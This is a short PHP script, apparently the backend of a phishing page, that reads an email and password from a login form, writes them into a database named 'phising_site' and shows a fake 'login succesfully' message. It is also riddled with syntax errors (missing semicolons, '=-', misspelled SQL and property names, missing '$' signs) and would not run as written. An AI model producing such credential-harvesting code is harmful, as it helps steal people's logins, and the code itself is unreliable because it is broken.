<?php
	$email = $_POST['Enter Email']
	$password = $_POST['Enter password']

	//database connection
	$conn =- new mysqli('localhost', 'root', '', 'phising_site')
	if($conn->connect_erorr){
		die('Connection Failed  : '.conn->connect_error);
	}else {
		$stmt = $conn->prepare("Insent into registration(Email, password)
			values(?, ?)");
		$stmt->bind_param("ss", $email, password)
		$stmt->execute():
		echo "login succesfully.....":
		$stmt->close();
		$stmt->close();
	}
?>